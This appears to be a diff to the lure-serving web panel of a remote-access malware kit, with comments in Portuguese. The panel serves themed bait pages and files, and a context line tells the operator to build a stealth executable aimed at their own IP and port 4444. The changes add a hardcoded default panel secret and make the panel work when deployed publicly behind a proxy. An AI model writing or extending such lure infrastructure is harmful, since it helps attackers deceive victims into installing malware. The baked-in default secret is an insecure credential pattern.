@@ -31,6 +31,18 @@ from urllib.parse import urlparse, parse_qs
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 VISITS = os.path.join(HERE, "visits.jsonl")
+SECRET_FILE = os.path.join(HERE, "link_secret.txt")
+# usado so quando nao ha --secret, nem RAF_SECRET, nem link_secret.txt
+DEFAULT_SECRET = "d4l_g3_Artpj"
+
+
+def _read_secret():
+    """Le o segredo do link do arquivo local, quando existir."""
+    try:
+        with open(SECRET_FILE, encoding="utf-8") as f:
+            return f.read().strip()
+    except OSError:
+        return ""
 
 # ------------------------------------------------------------------ lure themes
 THEMES = {
@@ -368,7 +380,15 @@ class Handler(BaseHTTPRequestHandler):
 
     def _base(self):
         host = self.headers.get("Host") or "127.0.0.1"
-        proto = self.headers.get("X-Forwarded-Proto") or "http"
+        proto = self.headers.get("X-Forwarded-Proto")
+        if not proto:
+            # atras de proxy (Render/Cloudflare) sem o header: host publico = https
+            h = host.split(":")[0].lower()
+            private = (h in ("localhost", "127.0.0.1", "::1", "[::1]")
+                       or h.startswith(("10.", "192.168.", "127.", "169.254."))
+                       or any(h.startswith("172.%d." % n) for n in range(16, 32))
+                       or h.endswith((".local", ".lan", ".internal")))
+            proto = "http" if private else "https"
         return "%s://%s" % (proto, host)
 
     def _send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
@@ -557,6 +577,14 @@ def main():
         print("    gere primeiro:  python builder.py --host SEU_IP --port 4444 "
               "--key SUA_KEY --stealth --exe")
         return 1
+
+    # o segredo pode vir da linha de comando, da variavel de ambiente ou do
+    # link_secret.txt que fica ao lado deste arquivo (assim o painel publicado
+    # continua fechado mesmo quando o host nao injeta variavel nenhuma)
+    if not a.secret:
+        a.secret = (os.environ.get("RAF_SECRET", "").strip()
+                    or _read_secret()
+                    or DEFAULT_SECRET)
 
     theme = THEMES[a.theme]
     name = a.name or (theme["file"] % "%s" if "%s" in theme["file"] else theme["file"])
